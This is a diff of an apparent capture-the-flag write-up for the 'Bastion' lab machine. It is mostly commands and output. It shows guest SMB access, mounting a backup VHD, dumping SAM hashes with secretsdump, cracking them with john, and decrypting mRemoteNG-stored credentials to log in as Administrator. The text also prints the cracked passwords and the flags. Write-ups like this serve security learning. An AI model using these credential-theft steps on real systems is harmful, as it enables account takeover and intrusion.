@@ -1,14 +1,16 @@
+# Bastion
+
 ---
 layout: post
 title: Bastion
-date: 2020-08-12 13:32:20 +0300
+date: 2020-08-12
 ## Discover and Exploit  
 
-1. root@kali:~# nmap -A -sC -sV -p- 10.10.10.134
-
- Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 16:29 EDT
+**1. **root@kali:~# nmap -A -sC -sV -p- 10.10.10.134****
+```	
+  Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 16:29 EDT
  
-        Nmap scan report for 10.10.10.134
+    Nmap scan report for 10.10.10.134
 	Host is up (0.028s latency)
 	Not shown: 65522 closed ports
 	PORT      STATE SERVICE      VERSION
@@ -77,9 +79,10 @@ date: 2020-08-12 13:32:20 +0300
 	
 	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 	Nmap done: 1 IP address (1 host up) scanned in 599.71 seconds
-	
-2. root@kali:~/results/10.10.10.134/scans# cat smbclient.txt 
-	
+```	
+
+**2. **root@kali:~/results/10.10.10.134/scans# cat smbclient.txt**** 
+```		
 	        Sharename       Type      Comment
 	        ---------       ----      -------
 	        ADMIN$          Disk      Remote Admin
@@ -87,14 +90,15 @@ date: 2020-08-12 13:32:20 +0300
 	        C$              Disk      Default share
 	        IPC$            IPC       Remote IPC
 	SMB1 disabled -- no workgroup available
+```	
 	
-3. root@kali:~/results/10.10.10.134/scans# cat smbmap-list-contents.txt
-
-	[!] Authentication error on 10.10.10.134
-	[!] RPC Authentication error occurred
-	[!] Authentication error on 10.10.10.134
-	[+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
-	[|] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\PXTIOWFUHV, please remove manually
+**3. **root@kali:~/results/10.10.10.134/scans# cat smbmap-list-contents.txt****
+```	
+        [!] Authentication error on 10.10.10.134
+        [!] RPC Authentication error occurred
+        [!] Authentication error on 10.10.10.134
+        [+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
+        [|] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\PXTIOWFUHV, please remove manually
 	
 	        Disk                                                    Permissions     Comment
 	        ----                                                    -----------     -------
@@ -171,13 +175,15 @@ date: 2020-08-12 13:32:20 +0300
 	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-248-0
 	        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-250-0
 	        fr--r--r--                3 Sun Dec 31 19:03:58 1600    winreg
-	[!] RPC Authentication error occurred
-	[!] Authentication error on 10.10.10.134
-	
-4. root@kali:/tmp/bastio# smbclient \\\\10.10.10.134\\Backups -N
-	Try "help" to get a list of possible commands.
-	smb: \> ls
-	  .                                   D        0  Wed Aug  5 16:33:47 2020
+        [!] RPC Authentication error occurred
+        [!] Authentication error on 10.10.10.134
+```	
+
+**4. **root@kali:/tmp/bastio# smbclient \\\\10.10.10.134\\Backups -N****
+```
+        Try "help" to get a list of possible commands.
+	    smb: \> ls
+      .                                   D        0  Wed Aug  5 16:33:47 2020
 	  ..                                  D        0  Wed Aug  5 16:33:47 2020
 	  GDVEJRLCBU                          D        0  Wed Aug  5 16:32:49 2020
 	  nmap-test-file                      A      260  Wed Aug  5 16:33:47 2020
@@ -186,23 +192,23 @@ date: 2020-08-12 13:32:20 +0300
 	  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
 	  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019
 	                                                                                                                                                                                                      
-	                7735807 blocks of size 4096. 2759362 blocks available                                                                                                                                 
+	                7735807 blocks of size 4096. 2759362 blocks available
+                    
 	smb: \> get note.txt                                                                                                                                                                                  
-	getting file \note.txt of size 116 as note.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)  
+	getting file \note.txt of size 116 as note.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
+```	         
 	
-5. root@kali:/tmp/bastio# cat note.txt 
-	
+**5. root@kali:/tmp/bastio# cat note.txt** 
+```		
 	 Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+```		
 	
+>Instead of downloading, we can mount the shared files locally.  Check the below link for more info : https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
 	
-	Instead of downloading, we can mount the shared files locally.  Check the below link for more info :
-	https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
-	
-	
-	
-6. root@kali:/mnt/bas# mount -t cifs  //10.10.10.134/Backups/ /tmp/bastio/mnt/
-	Password for root@//10.10.10.134/Backups/:  
-	root@kali:/mnt/bas# cd /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/
+**6. root@kali:/mnt/bas# mount -t cifs  //10.10.10.134/Backups/ /tmp/bastio/mnt/**
+```	
+   Password for root@//10.10.10.134/Backups/:  
+    root@kali:/mnt/bas# cd /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/
 	root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC# ls -la
 	total 8
 	drwxr-xr-x 2 root root 4096 Feb 22  2019  .
@@ -220,12 +226,14 @@ date: 2020-08-12 13:32:20 +0300
 	cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml                                           cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
 	cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml                                     cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
 	cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+```	
 	
-	To mount vhd file we use the tool guestmount, we need to install libguestfs-tools for this
+>To mount vhd file we use the tool guestmount, we need to install libguestfs-tools for this
 	
-7. root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# guestmount --add /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\       124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /tmp/bastio/empty/
+**7. root@kali:/tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351# guestmount --add /tmp/bastio/mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\       124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /tmp/bastio/empty/**
 
-8. root@kali:/tmp/bastio/empty# ls -la
+**8. root@kali:/tmp/bastio/empty# ls -la**
+```
 	total 2096745
 	drwxrwxrwx 1 root root      12288 Feb 22  2019  .
 	drwxr-xr-x 4 root root       4096 Aug  8 11:52  ..
@@ -241,11 +249,13 @@ date: 2020-08-12 13:32:20 +0300
 	drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
 	drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
 	drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
-	
-9. root@kali:/tmp/bastio/empty/Users# ls
+```
+
+**9. root@kali:/tmp/bastio/empty/Users# ls**
 	'All Users'   Default  'Default User'   desktop.ini   L4mpje   Public
 	
-10. root@kali:/tmp/bastio/empty/Windows/System32/config£ ls -la
+**10. root@kali:/tmp/bastio/empty/Windows/System32/config£ ls -la**
+```
 	total 74740
 	drwxrwxrwx 1 root root    12288 Feb 22  2019 .
 	drwxrwxrwx 1 root root   655360 Feb 22  2019 ..
@@ -286,13 +296,13 @@ date: 2020-08-12 13:32:20 +0300
 	-rwxrwxrwx 2 root root        0 Jul 13  2009 SYSTEM.LOG2
 	drwxrwxrwx 1 root root     4096 Nov 20  2010 systemprofile
 	drwxrwxrwx 1 root root     4096 Feb 22  2019 TxR
+```	
+	
+>To extract Password hash we use secretsdump.py https://www.hackingarticles.in/credential-dumping-sam/
 	
 	
-	To extract Password hash we use secretsdump.py
-	 https://www.hackingarticles.in/credential-dumping-sam/
-	
-	
-11. root@kali:/tmp/bastio/empty/Windows/System32/config£ secretsdump.py -sam SAM -system SYSTEM LOCAL
+**11. root@kali:/tmp/bastio/empty/Windows/System32/config£ secretsdump.py -sam SAM -system SYSTEM LOCAL**
+```
 	Impacket v0.9.22.dev1+20200629.145357.5d4ad6cc - Copyright 2020 SecureAuth Corporation
 	
 	[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
@@ -301,20 +311,26 @@ date: 2020-08-12 13:32:20 +0300
 	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 	L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 	[*] Cleaning up... 
-	
-12. root@kali:/tmp/bastio# john --format=NT /tmp/bastio/hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**12. root@kali:/tmp/bastio# john --format=NT /tmp/bastio/hash --wordlist=/usr/share/wordlists/rockyou.txt**
+```
 	Using default input encoding: UTF-8
 	Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
 	No password hashes left to crack (see FAQ)
 	
 	1 password hash cracked, 0 left
-	
-13. root@kali:/tmp/bastio# john --format=NT /tmp/bastio/hash --show
+```
+
+**13. root@kali:/tmp/bastio# john --format=NT /tmp/bastio/hash --show**
+```
 	Administrator::500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 	Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 	L4mpje:bureaulampje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+```
 
-14. root@kali:/tmp/bastio/empty/Windows/System32/config£ ssh L4mpje@10.10.10.134
+**14. root@kali:/tmp/bastio/empty/Windows/System32/config£ ssh L4mpje@10.10.10.134**
+```
 	L4mpje@10.10.10.134's password: 
 	Microsoft Windows [Version 10.0.14393]                                                                                          
 	(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
@@ -323,12 +339,13 @@ date: 2020-08-12 13:32:20 +0300
 	bastion\l4mpje        
 	
 	User.txt : 9bfe57d5c3309db3a151772f9d86c6cd
-
+```
 
 
 ## Privilege Escalation
-12. l4mpje@BASTION C:\>whoami /priv                                                                                                                                                                       
-	                                                                                                                                                                                                      
+
+**12. l4mpje@BASTION C:\>whoami /priv**                                                                                                                                                                       
+```	                                                                                                                                                                                                      
 	PRIVILEGES INFORMATION                                                                                                                                                                                
 	----------------------                                                                                                                                                                                
 	                                                                                                                                                                                                      
@@ -339,9 +356,10 @@ date: 2020-08-12 13:32:20 +0300
 	
 	Noticed that we have mRemoteNG , which stores encrypted password in a XML file
 	http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html
-	       
+```	       
 	
-13. l4mpje@BASTION C:\Program Files (x86)>dir                                                                                                                                                             
+**13. l4mpje@BASTION C:\Program Files (x86)>dir**
+```                                                                                                                                                            
 	 Volume in drive C has no label.                                                                                                                                                                      
 	 Volume Serial Number is 0CB3-C487                                                                                                                                                                    
 	                                                                                                                                                                                                      
@@ -361,17 +379,16 @@ date: 2020-08-12 13:32:20 +0300
 	23-02-2019  11:22    <DIR>          Windows Photo Viewer                                                                                                                                              
 	16-07-2016  15:23    <DIR>          Windows Portable Devices                                                                                                                                          
 	16-07-2016  15:23    <DIR>          WindowsPowerShell 
+```	
 	
-	
-	We see mRemoteNG , remote connection manager for Windows which uses XML file to save passwords in encrypted format
-	More info here : http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html
-	
-	
-	Since appdata folder is hidden  enter "attrib -s -h C:\Users\myusername\AppData" ,  
-	https://www.windows10themes.net/guides/how-to-view-the-appdata-folder-in-windows-10/
-	
-14. l4mpje@BASTION C:\Users\Public>attrib -s -h C:\Users\L4mpje\AppData 
-15. l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                                                                                                            
+>We see mRemoteNG , remote connection manager for Windows which uses XML file to save passwords in encrypted format
+
+>More info here : http://cosine-security.blogspot.com/2011/06/stealing-password-from-mremote.html
+
+**14. l4mpje@BASTION C:\Users\Public>attrib -s -h C:\Users\L4mpje\AppData** 
+
+**15. l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml**
+```                                                                                                                            
 	<?xml version="1.0" encoding="utf-8"?>                                                                                                                                                                
 	<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GC                                                                      
 	M" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0                                                                      
@@ -395,16 +412,17 @@ date: 2020-08-12 13:32:20 +0300
 	ession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="fa                                                                      
 	lse" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoad                                                                      
 	BalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" Inheri 
+```	
 	
-	
-	For Decrypting I used a tool mremoteng_decrypt
-	https://github.com/kmahyyg/mremoteng-decrypt
+>For Decrypting I used a tool mremoteng_decrypt https://github.com/kmahyyg/mremoteng-decrypt
 	   
 	
-16. root@kali:~/newgits/mRemoteNG-Decrypt# python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
-	Password: thXLHM96BeKL0ER2
+**16. root@kali:~/newgits/mRemoteNG-Decrypt# python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==**
+	
+    Password: thXLHM96BeKL0ER2
 	 
-17. root@kali:~/newgits/mRemoteNG-Decrypt# ssh Administrator@10.10.10.134
+**17. root@kali:~/newgits/mRemoteNG-Decrypt# ssh Administrator@10.10.10.134**
+```
 	Administrator@10.10.10.134's password: 
 	Microsoft Windows [Version 10.0.14393]                                                                                          
 	(c) 2016 Microsoft Corporation. All rights reserved.                                                                            
@@ -424,7 +442,8 @@ date: 2020-08-12 13:32:20 +0300
 	23-02-2019  10:40    <DIR>          ..                                                                                          
 	23-02-2019  10:07                32 root.txt                                                                                    
 	               1 File(s)             32 bytes                                                                                   
-	               2 Dir(s)  11.301.339.136 bytes free                                                                              
+	               2 Dir(s)  11.301.339.136 bytes free
+ ```
 	
-	administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                              
+>administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                              
         958850b91811676ed6620a9c430e65c8
